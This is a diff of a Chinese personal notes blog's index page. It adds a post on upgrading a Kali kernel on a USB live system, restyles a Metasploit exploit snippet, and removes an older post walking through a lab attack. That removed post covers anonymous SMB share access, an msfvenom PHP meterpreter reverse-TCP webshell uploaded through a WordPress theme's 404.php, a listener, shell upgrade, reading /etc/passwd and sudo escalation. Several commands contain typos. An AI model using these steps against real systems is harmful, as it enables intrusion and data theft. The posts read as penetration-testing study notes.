@@ -264,6 +264,171 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://newird.github.io2020/03/16/update-kali-kernel/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="newird">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/head.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="各种笔记">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="2020/03/16/update-kali-kernel/" itemprop="url">update_kali_kernel</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-16T18:01:57+08:00">
+                2020-03-16
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="categories/kali/" itemprop="url" rel="index">
+                    <span itemprop="name">kali</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="升级Linux-内核"><a href="#升级Linux-内核" class="headerlink" title="升级Linux 内核"></a>升级Linux 内核</h2><p>最近升级了一下Linux 内核，我的Linux是跑在U盘上的，和一般的升级有点区别，但没多大难度，遇到的麻烦总结一下</p>
+<ol>
+<li><p>查找最新的内核</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-cahce searc linux-images-*</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>升级到最新的内核</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install linux-image-(kernel version)</span><br><span class="line">apt-get install linux-header-(kernel version)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>升级好的内核不会自动安装，不能通过卸载原来的内核安装。新安装的内核在/boot目录下</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ls #查看一下下载的文件</span><br><span class="line">df -h #查看一下live跑的目录，带*的</span><br><span class="line">cp /boot/linux-image-(kernel version) /run/live/presisent/sdba1/live</span><br><span class="line">cp /boot/linux-header-(kernel version) /run/live/presisent/sdba1/live</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>生成的文件没有启动项，要自己生成，linux内置了现成的框架</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/sbin/update-initramfs.orig.initramfs-tools -c -k (kernel version)</span><br></pre></td></tr></table></figure>
+
+<p>tips:这里要注意的是后面的参数要和你装的kernel版本完全一致</p>
+<p>比如我的版本是5.4.0-kali4-amd64 ，不能写成5.4.0</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp initrd.img-(kernel version) /run/live/presisent/sdba1/live</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>修改grub</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim <span class="regexp">/run/</span>live<span class="regexp">/persistence/</span>sda1<span class="regexp">/boot/g</span>rub<span class="regexp">/grub.cfg</span></span><br></pre></td></tr></table></figure>
+
+<p>把Linux 和initrd换成新的，reboot 完成</p>
+</li>
+</ol>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://newird.github.io2020/03/16/dockerAndvm/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
@@ -1301,7 +1466,7 @@
 <li><p>输入search对应的软件及版本号</p>
 </li>
 <li><p>攻击</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span>使用exploit</span><br><span class="line">use exploit(具体内容)</span><br><span class="line"><span class="meta">#</span>查看可以使用的payload</span><br><span class="line">show payloads</span><br><span class="line"><span class="meta">#</span>设置payload</span><br><span class="line">set payload</span><br><span class="line"><span class="meta">#</span>设置参数</span><br><span class="line">show options</span><br><span class="line">set rhost 靶场ip</span><br><span class="line">set lhost 攻击机ip</span><br><span class="line"><span class="meta">#</span>进行远程溢出</span><br><span class="line">exploit</span><br><span class="line"><span class="meta">#</span>执行命令</span><br><span class="line">id</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">使用exploit</span></span><br><span class="line">use exploit(具体内容)</span><br><span class="line"><span class="meta">#</span><span class="bash">查看可以使用的payload</span></span><br><span class="line">show payloads</span><br><span class="line"><span class="meta">#</span><span class="bash">设置payload</span></span><br><span class="line">set payload</span><br><span class="line"><span class="meta">#</span><span class="bash">设置参数</span></span><br><span class="line">show options</span><br><span class="line">set rhost 靶场ip</span><br><span class="line">set lhost 攻击机ip</span><br><span class="line"><span class="meta">#</span><span class="bash">进行远程溢出</span></span><br><span class="line">exploit</span><br><span class="line"><span class="meta">#</span><span class="bash">执行命令</span></span><br><span class="line">id</span><br></pre></td></tr></table></figure>
 
 </li>
 </ol>
@@ -1656,181 +1821,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://newird.github.io2019/08/24/Smb (server message block)信息泄露/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="newird">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/head.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="各种笔记">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="2019/08/24/Smb (server message block)信息泄露/" itemprop="url">smb服务</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-08-24T11:06:59+08:00">
-                2019-08-24
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
-                  <a href="categories/安全/" itemprop="url" rel="index">
-                    <span itemprop="name">安全</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="Smb-server-message-block-信息泄露"><a href="#Smb-server-message-block-信息泄露" class="headerlink" title="Smb (server message block)信息泄露"></a>Smb (server message block)信息泄露</h1><h2 id="信息探测"><a href="#信息探测" class="headerlink" title="信息探测"></a>信息探测</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV<span class="built_in"> ip </span> 探测服务信息</span><br><span class="line"></span><br><span class="line">namp -A -v -T4<span class="built_in"> ip </span> 靶场全部信息,最大线程</span><br></pre></td></tr></table></figure>
-
-<h3 id="分析结果"><a href="#分析结果" class="headerlink" title="分析结果"></a>分析结果</h3><h4 id="smb-弱点"><a href="#smb-弱点" class="headerlink" title="smb 弱点"></a>smb 弱点</h4><ol>
-<li>空口令登录</li>
-</ol>
-<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">smbclient -L ip</span><br><span class="line"></span><br><span class="line"> smbclient '<span class="symbol">\\</span>ip<span class="symbol">\p</span>rint$'</span><br><span class="line"></span><br><span class="line">smbclient '<span class="symbol">\\</span>ip<span class="symbol">\s</span>hare$'</span><br><span class="line"></span><br><span class="line"> get 敏感文件</span><br></pre></td></tr></table></figure>
-
-<ol start="2">
-<li><p>远程溢出漏洞分析</p>
-<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">searchsploit</span> asmba  查看版本号</span><br></pre></td></tr></table></figure>
-
-<p>针对http协议</p>
-<ol>
-<li>浏览器查看网站</li>
-<li>使用 dirb nikto探测</li>
-<li>寻找突破口,后台,传shell</li>
-</ol>
-</li>
-</ol>
-<h3 id="制作webshell"><a href="#制作webshell" class="headerlink" title="制作webshell"></a>制作webshell</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfcvenom -p php/meterpreter/reverse_tcp <span class="attribute">lhost</span>=攻击ip <span class="attribute">lhost</span>=4444 -f<span class="built_in"> raw </span>&gt; /root/Desktop/shell.php</span><br></pre></td></tr></table></figure>
-
-<h3 id="启动监听"><a href="#启动监听" class="headerlink" title="启动监听"></a>启动监听</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/hander</span><br><span class="line">msf exploit(hander) &gt; set payload php/merterpreter/reverse_tcp</span><br><span class="line">msf exploit(hander) &gt; set host 攻击ip</span><br><span class="line">msf exploit(hander) &gt; set lport 4444</span><br><span class="line">msf exploit(hander) run</span><br></pre></td></tr></table></figure>
-
-<h3 id="上传webshell"><a href="#上传webshell" class="headerlink" title="上传webshell"></a>上传webshell</h3><p>找到敏感点</p>
-<p>wordpress 上传点 theme 404.php</p>
-<p>执行 <a href="http://ip/wordpress/wp-contentthemes/twentyfourteen/404.php" target="_blank" rel="noopener">http://ip/wordpress/wp-contentthemes/twentyfourteen/404.php</a></p>
-<h3 id="优化终端"><a href="#优化终端" class="headerlink" title="优化终端"></a>优化终端</h3><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -<span class="built_in">c</span> '<span class="keyword">import</span> pty;pty.spawn("/bin/bash")'</span><br></pre></td></tr></table></figure>
-
-<p>查找用户名  </p>
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat <span class="regexp">/etc/</span>passwd</span><br></pre></td></tr></table></figure>
-
-<p>在共享资源查找敏感文件</p>
-<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">su</span> 用户名</span><br><span class="line">sudo -<span class="keyword">l</span> </span><br><span class="line">sudo <span class="keyword">su</span></span><br></pre></td></tr></table></figure>
-
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -1883,7 +1873,7 @@
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">14</span>
+                  <span class="site-state-item-count">15</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -1905,7 +1895,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="tags/index.html">
-                  <span class="site-state-item-count">16</span>
+                  <span class="site-state-item-count">17</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
